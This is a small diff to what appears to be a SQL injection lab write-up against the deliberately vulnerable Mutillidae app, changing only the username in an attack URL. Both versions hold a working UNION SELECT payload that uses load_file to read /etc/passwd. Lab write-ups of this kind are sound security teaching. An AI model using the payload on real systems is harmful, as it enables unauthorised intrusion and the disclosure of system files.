@@ -141,7 +141,7 @@ We can use the “LOAD_FILE()” operator to peruse the contents of any file con
 
 Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
 
-http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details 
+http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=bharathi%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details 
 
 ![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/ef20ed2e-14b7-483c-b28b-583cb3f98b9c)
 
